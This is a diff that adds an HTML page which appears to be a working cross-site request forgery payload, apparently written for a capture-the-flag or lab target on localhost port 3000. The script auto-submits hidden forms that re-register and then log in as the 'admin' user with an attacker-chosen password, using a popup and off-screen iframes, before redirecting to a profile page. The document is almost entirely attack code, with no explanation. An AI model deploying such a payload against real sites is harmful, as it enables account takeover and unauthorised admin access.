@@ -1,0 +1,25 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>load</title></head>
+<body style="margin:0;background:#fff">
+<iframe id="busy" src="https://httpbin.org/delay/9" style="position:absolute;left:-9999px;width:1px;height:1px"></iframe>
+<script>
+var HOST='http://127.0.0.1:3000';
+var REG=HOST+'/register';
+var PROFILE=HOST+'/profile#clearance';
+// try to (re)register the seeded admin internally with our password
+var FORM='<form id="f" method="POST" action="'+REG+'">'+
+  '<input name="username" value="admin">'+
+  '<input name="password" value="PwnGold_9271">'+
+  '</form><script>document.getElementById("f").submit();<\/scr'+'ipt>';
+try{ var w=window.open('','rg','width=200,height=200'); if(w){ w.document.open(); w.document.write(FORM); w.document.close(); } }catch(e){}
+// fallback: also login as admin with that password (in case register created it but didn't auto-login)
+try{
+  var f2=document.createElement('iframe'); f2.name='lf2'; f2.style.cssText='position:absolute;left:-9999px;width:1px;height:1px'; document.body.appendChild(f2);
+  setTimeout(function(){
+    var frm=document.createElement('form'); frm.method='POST'; frm.action=HOST+'/login'; frm.target='lf2';
+    frm.innerHTML='<input name=username value=admin><input name=password value="PwnGold_9271">'; document.body.appendChild(frm); frm.submit();
+  },1200);
+}catch(e){}
+setTimeout(function(){ window.location.href=PROFILE; },3200);
+</script>
+</body></html>
